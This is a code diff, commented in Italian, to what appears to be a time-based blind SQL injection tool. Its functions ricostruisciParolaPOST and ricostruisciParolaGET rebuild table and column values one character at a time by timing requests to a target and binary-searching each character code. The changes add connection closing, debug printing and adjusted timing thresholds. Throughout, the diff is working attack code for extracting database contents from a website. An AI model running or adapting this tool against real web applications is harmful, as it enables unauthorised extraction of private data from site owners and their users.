@@ -48,22 +48,25 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                 start = time.time()
                 req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                 req.content
+                req.close()
                 end = time.time()
 
                 # se succede questo allora lo abbiamo trovato
-                if ((end - start )> OptionConfiguration.timeToWait):
+                if ((end - start )> OptionConfiguration.timeToWait ):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     #print (end, start, chr(mid),req.elapsed.total_seconds())
+                    print("")
                     # se succede questo allora lo abbiamo trovato
-                    if ((end - start) > OptionConfiguration.timeToWait):
+                    if ((end - start) > OptionConfiguration.timeToWait ):
                     #carattere troato
                         trovato = True
                         value=value+chr(mid)
-                        #print (("Position %s "+str(chr(mid)))%(mid))
+                        print (("Position %s "+str(chr(mid)))%(mid))
                         break
                 else:
                     dataToSent = OptionConfiguration.data.copy()
@@ -87,6 +90,7 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                         # sono nella ,eta superiore
@@ -94,6 +98,7 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -135,17 +140,19 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                 start = time.time()
                 req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                 req.content
+                req.close()
                 end = time.time()
                 # se succede questo allora lo abbiamo trovato
                 #time of execution for control
-                #print (end-start),chr(mid),req.elapsed.total_seconds()
-                if ((end - start) > OptionConfiguration.timeToWait):
+                print ((end-start),chr(mid),req.elapsed.total_seconds())
+                if ((end - start) >= OptionConfiguration.timeToWait ):
 
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
-                    if ((end - start) >OptionConfiguration.timeToWait):
+                    if ((end - start) >=OptionConfiguration.timeToWait ):
                         trovato = True
                         value = value + chr(mid)
                         #print (("posizione %s "+str(chr(mid)))%(i))
@@ -174,17 +181,19 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
-                    if ((end - start) >= OptionConfiguration.timeToWait):
+                    if ((end - start) >= OptionConfiguration.timeToWait ):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
-                        if ((end - start) >= OptionConfiguration.timeToWait):
+                        if ((end - start) >= OptionConfiguration.timeToWait ):
                             min = mid + 1
                     # sono nella meta inferiore
                     else:
@@ -244,6 +253,7 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                 start = time.time()
                 req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                 req.content
+                req.close()
                 end = time.time()
 
                 # se succede questo allora lo abbiamo trovato
@@ -254,10 +264,11 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
-                    if ((end - start) >= OptionConfiguration.timeToWait):
+                    if ((end - start) >= OptionConfiguration.timeToWait and (end-start)<=OptionConfiguration.timeToWait*2):
                         # carattere trovato
                         trovato = True
                         value = value + chr(mid)
@@ -286,6 +297,7 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
@@ -294,6 +306,7 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                         req.content
+                        req.close()
                         end = time.time()
 
                             # sono nella ,eta superiore
@@ -336,6 +349,7 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                 start = time.time()
                 req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                 req.content
+                req.close()
                 end = time.time()
 
                 # se succede questo allora lo abbiamo trovato
@@ -344,10 +358,11 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
-                    if ((end - start) >= OptionConfiguration.timeToWait):
+                    if ((end - start) >= OptionConfiguration.timeToWait and (end-start)<=OptionConfiguration.timeToWait*2):
                         # carattere trovato
                         trovato = True
                         value = value + chr(mid)
@@ -380,15 +395,17 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
-                    if ((end - start )>= OptionConfiguration.timeToWait):
+                    if ((end - start )>= OptionConfiguration.timeToWait ):
 
                         data = sqliAttack.creaStringaGet(dataToSent)
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
